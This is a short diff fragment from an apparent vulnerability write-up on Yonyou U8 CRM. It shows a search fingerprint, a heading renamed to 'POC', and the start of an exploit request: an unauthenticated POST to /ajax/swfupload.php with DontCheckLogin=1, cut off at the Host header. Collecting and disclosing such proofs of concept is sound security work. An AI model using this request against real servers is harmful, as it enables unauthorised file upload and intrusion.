@@ -5,7 +5,7 @@
 body="用友U8CRM"
 ```
 
-## poc
+## POC
 ```
 POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
 Host: 
